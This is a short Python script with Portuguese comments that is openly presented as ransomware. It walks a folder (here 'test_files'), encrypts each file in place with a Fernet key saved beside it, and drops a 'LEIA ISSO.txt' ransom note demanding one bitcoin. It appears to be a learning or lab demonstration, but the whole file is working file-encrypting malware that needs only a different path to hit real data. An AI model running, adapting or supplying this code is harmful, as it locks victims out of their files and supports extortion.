import os
from cryptography.fernet import Fernet

#1. Gerar uma chave de criptografia e salvar
def gerar_chave():
    chave = Fernet.generate_key() 
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

#2. Carregar a chave salva
def carregar_chave():
    return open("chave.key", "rb").read()

#3. Criptografar um único arquivo
def criptografar_arquivo(arquivo, chave):
    """
    Essa função criptografa os dados de um arquivo.
    
    Args:
        arquivo (str): Arquivo a ser criptografado.
        chave (str): Chave para criptografar.
    """
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

#4. Encontrar arquivos para criptografar 
def encontrar_arquivos(diretorio: str) -> list[str]:
    """
    Abre uma pasta, lista todos os arquivos da pasta para serem encriptografados.
    
    Args:
        diretorio (str): Caminho da pasta.
    """
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransoware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

#5. Mensagem de resgate
def criar_mensagem_resgate():
    """ Escreve a mensagem de resgate. """
    with open("LEIA ISSO.txt", "w", encoding="utf-8") as f:
        f.write("Seus arquivos foram criptografados!\n")
        f.write("Envia 1 bitcoin para o endereço X e envie o comprovante!\n")
        f.write("Depois disso, enviaremos a chave para você recuperar seus dados!\n")


#6. Execução principal
def main():
    """ Roda o código. """
    
    gerar_chave()
    chave: str = carregar_chave()
    arquivos: list = encontrar_arquivos("test_files")
    
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    
    criar_mensagem_resgate()
    print("Ransoware executado! Arquivos criptografos!")

if __name__=="__main__":
    main()
